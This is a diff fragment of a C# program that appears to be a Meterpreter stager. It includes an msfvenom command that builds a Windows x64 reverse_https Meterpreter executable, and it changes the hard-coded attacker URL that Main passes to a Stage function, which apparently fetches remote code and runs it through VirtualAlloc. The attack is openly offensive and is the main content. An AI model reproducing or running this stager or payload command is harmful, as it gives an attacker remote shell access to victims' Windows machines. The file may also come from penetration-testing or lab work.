@@ -10,7 +10,6 @@ public class Program
 
 	
 //msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<Attack_IP> LPORT=8080 -f exe > rev.exe
-//En la prueba he generado payload en formato exe, quizás con formato c# es más apropiado
 
     //https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc 
     [DllImport("kernel32")]
@@ -35,7 +34,7 @@ public class Program
 
 public static void Main()
     {
-        string url = "https://192.168.162.5:8080/_-AV47woKK9VoVSjNXOJvA96ALHKsr2LmNc8grsvwQMcvm9i-3cmWCC1tsWcLIzpC9xeub-suNeGMVoUYoJgEvVyFXITrdzcNelfqXU4tvPgW0B8SIbJwUYXFhQq-GWd9A2g3inU";
+        string url = "https://192.168.162.5:8080/GWd9A2g3inU";
         Stage(url);
     }
 
